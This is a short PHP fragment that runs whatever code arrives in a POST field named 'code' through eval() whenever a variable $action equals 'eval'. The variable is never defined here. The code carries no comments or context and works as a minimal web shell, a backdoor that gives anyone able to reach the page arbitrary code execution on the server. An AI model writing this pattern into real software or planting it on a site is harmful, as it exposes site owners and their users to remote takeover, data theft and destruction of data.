<?php
if($action === "eval")
{
    $code = $_POST["code"];
    ob_start();
    eval($code);
}

?>